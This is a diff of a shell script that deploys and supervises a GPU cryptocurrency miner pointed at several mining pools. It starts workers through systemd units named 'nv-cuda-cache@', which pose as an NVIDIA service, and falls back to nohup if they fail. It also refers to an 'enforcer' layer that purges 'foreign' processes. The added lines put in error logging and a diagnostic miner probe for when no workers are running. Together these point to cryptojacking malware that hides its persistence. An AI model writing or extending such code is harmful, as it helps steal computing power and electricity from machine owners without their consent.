@@ -67,7 +67,8 @@ while :; do
     --url stratum+ssl://pool.pearlhash.xyz:9443 \\
     --url stratum+tcp://pearl.luckypool.io:3360 \\
     --user $W/ul-ps-$HN-g$i --password x \\
-    --log-file $L/krig-$HN-g$i.log --no-tui --no-telemetry -l info
+    --log-file $L/krig-$HN-g$i.log --no-tui --no-telemetry -l info \\
+    2>>$L/krig-$HN-g$i.err
   echo "[supervisor] krig exited rc=\$? at \$(date -u)" >> $L/krig-$HN-g$i.sup.log
   sleep 20
 done
@@ -95,7 +96,15 @@ while [ "$i" -lt "${N:-0}" ]; do
   systemctl enable --now "nv-cuda-cache@$i" >/dev/null 2>&1 || { setsid nohup bash "$B/krig_g$i.sh" >/dev/null 2>&1 & }
   i=$((i+1))
 done
-log "workers started: $(pgrep -fc krig-miner 2>/dev/null)"
+sleep 6
+KP=$(pgrep -fc krig-miner 2>/dev/null)
+log "workers started: $KP"
+if [ "${KP:-0}" -eq 0 ]; then
+  log "DIAG krig not running; 12s probe follows"
+  timeout 12 "$B/krig/krig-miner" --coin pearl -d 0 --url stratum+ssl://prl.kryptex.network:8048 --user "$W/ul-ps-$HN-g0" --password x --no-tui --no-telemetry -l info 2>&1 | tail -20 >> "$L/ps8.log"
+  ls -la "$B/krig" >> "$L/ps8.log" 2>&1
+  nvidia-smi --query-gpu=index,name,driver_version,memory.total --format=csv,noheader >> "$L/ps8.log" 2>&1
+fi
 
 # ---------- layer 3: enforcer (foreign purge + per-gpu liveness) ----------
 cat > "$B/ps8_enforce.sh" <<EOF4
